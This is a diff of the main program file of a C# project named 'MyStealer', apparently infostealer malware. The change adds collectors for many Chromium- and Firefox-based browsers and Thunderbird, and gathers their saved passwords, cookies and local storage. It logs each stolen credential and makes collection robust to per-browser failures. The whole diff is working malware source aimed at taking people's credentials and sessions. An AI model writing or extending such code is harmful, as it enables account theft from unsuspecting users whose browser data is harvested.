@@ -1,6 +1,7 @@
 ﻿using MyStealer.Collectors;
 using MyStealer.Collectors.Browser;
 using MyStealer.Collectors.Browser.ChromiumBased;
+using MyStealer.Collectors.Browser.FirefoxBased;
 using Serilog;
 using System;
 using System.Collections.Generic;
@@ -11,9 +12,18 @@ namespace MyStealer
     internal static class Program
     {
         private static readonly IBrowserCollector[] BrowserCollectors = new IBrowserCollector[] {
+            new Brave(),
             new Chrome(),
+            new IridiumBrowser(),
             new MicrosoftEdge(),
-            new Brave()
+            new NaverWhale(),
+            new OperaStable(),
+            new YandexBrowser(),
+            new Firefox(),
+            new LibreWolf(),
+            new PaleMoon(),
+            new Thunderbird(),
+            new WaterFox(),
         };
 
         static void Main(string[] args)
@@ -39,17 +49,63 @@ namespace MyStealer
 
                     var creds = new HashSet<CredentialEntry>();
                     var cookies = new HashSet<CookieEntry>();
+                    var localStorage = new HashSet<LocalStorageEntry>();
                     foreach (var browser in BrowserCollectors)
                     {
-                        Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
-                        if (browser.IsAvailable())
+                        try
                         {
-                            Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
-                            browser.Initialize();
-                            foreach (var cred in browser.GetCredentials())
-                                creds.Add(cred);
-                            foreach (var cookie in browser.GetCookies())
-                                cookies.Add(cookie);
+                            Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
+                            if (browser.IsAvailable())
+                            {
+                                Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
+                                browser.Initialize();
+                                try
+                                {
+                                    foreach (var cred in browser.GetCredentials())
+                                    {
+                                        creds.Add(cred);
+                                        Log.Information(cred.ToString());
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Log.Error(ex, "Browser credentials {name} failed.", browser.ApplicationName);
+                                }
+
+                                try
+                                {
+                                    foreach (var cookie in browser.GetCookies())
+                                    {
+                                        cookies.Add(cookie);
+                                        //Log.Information(cookie.ToString());
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Log.Error(ex, "Browser cookies {name} failed.", browser.ApplicationName);
+                                }
+
+                                try
+                                {
+                                    foreach (var storageEntry in browser.GetLocalStorageEntries())
+                                    {
+                                        localStorage.Add(storageEntry);
+                                        //Log.Information(storageEntry.ToString());
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Log.Error(ex, "Browser storages {name} failed.", browser.ApplicationName);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Log.Error(ex, "Browser collector {name} failed.", browser.ApplicationName);
+                        }
+                        finally
+                        {
+                            browser.Dispose(); // Unload natives
                         }
                     }
 
